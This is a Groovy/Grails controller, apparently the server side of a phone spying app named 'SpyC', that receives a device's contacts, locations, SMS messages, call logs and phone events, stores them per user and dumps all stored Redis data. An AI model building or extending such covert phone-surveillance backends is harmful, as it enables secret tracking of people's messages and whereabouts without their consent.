package com.xaviar

import static org.springframework.web.bind.annotation.RequestMethod.POST

import org.codehaus.jackson.JsonParseException
import org.codehaus.jackson.map.JsonMappingException
import org.codehaus.jackson.map.ObjectMapper
import org.codehaus.jackson.type.TypeReference

import redis.clients.jedis.Jedis

import com.org.krams.domain.Contact
import com.org.krams.domain.Location;
import com.org.krams.domain.PhoneParams;
import com.org.krams.domain.Sms;
import com.org.krams.domain.UMetaData
import com.xaviar.market.rest.item.DataHolder

class SpyCController {

	def redisService
	def contactService
	def locationService
	def smsService
	def userService

	def createdata(DataHolder dataHolder) {
		
		dataHolder.data = '{"userId":"129","simSubscriberId":"3453453444"}';
		String clientContacts = dataHolder.get(DataHolder.CONTACTS);
		String clientLocation = dataHolder.get(DataHolder.LOCATION);
		String clientSms = dataHolder.get(DataHolder.SMS);
		String clientCallLog = dataHolder.get(DataHolder.CALL_LOG);
		String clientPhoneEvent = dataHolder.get(DataHolder.PHONE_EVENT);
		String clientPhoneParams = dataHolder.get(DataHolder.PHONE_PARAMS);
		String clientSmsEvent = dataHolder.get(DataHolder.SMS_EVENT);

		if (dataHolder.data != null) {
			ObjectMapper mapper = new ObjectMapper();
			UMetaData uMetaData = mapper.readValue(dataHolder.data,UMetaData.class);
			userService.addUserInfo(uMetaData);
			
			//		Iterator<Map.Entry<String, String>> iterator = dataHolder.map.entrySet().iterator();
			//		while (iterator.hasNext()) {
			//			Map.Entry<String, String> mapEntry = (Map.Entry<String, String>) iterator
			//					.next();
			//			Jedis jedis = new Jedis("localhost");
			//			jedis.set(mapEntry.getKey().toString(), mapEntry.getValue()
			//					.toString());
			//		}


			try {
				if (clientContacts != null) {
					mapper = new ObjectMapper();
					List<Contact> contacts = mapper.readValue(clientContacts,new TypeReference<List<Contact>>() {
							});
					contactService.createAll(contacts,uMetaData);
				}

				if (clientLocation != null) {
					mapper = new ObjectMapper();
					List<Location> locations = mapper.readValue(clientLocation,new TypeReference<List<Location>>() {
							});
					locationService.createAll(locations,uMetaData);
				}

				if (clientSms != null) {
					mapper = new ObjectMapper();
					List<Sms> smses = mapper.readValue(clientSms,new TypeReference<List<Sms>>() {
							});
					smsService.createAll(smses,uMetaData);
				}
				
				if (clientPhoneParams != null) {
					mapper = new ObjectMapper();
					List<PhoneParams> phoneParams = mapper.readValue(clientPhoneParams,new TypeReference<List<PhoneParams>>() {
							});

				}

				final int id = 12;
				dataHolder.setID(id);

				[dataHolder:dataHolder]
			} catch (JsonParseException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (JsonMappingException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	def getdata ={

		def DataHolder dataholder = new DataHolder();
		def Map<String, String> map = dataholder.getMap();
		def keys = redisService.withRedis { Jedis redis ->
			redis.keys("*");
		}

		for (key in keys) {
			def jsonData = redisService.withRedis { Jedis redis ->
				redis.get(key.toString());
			}

			if(jsonData!=null){
				map.put(key, jsonData);
			}
		}

		// print out data as json for test in the browser
		// render(contentType: 'text/json') {[dataholder:dataholder]}
		// also set urimappings.groovy action of getdata to GET :
		// action = [GET: "getdata"]

		[dataholder:dataholder]
	}
}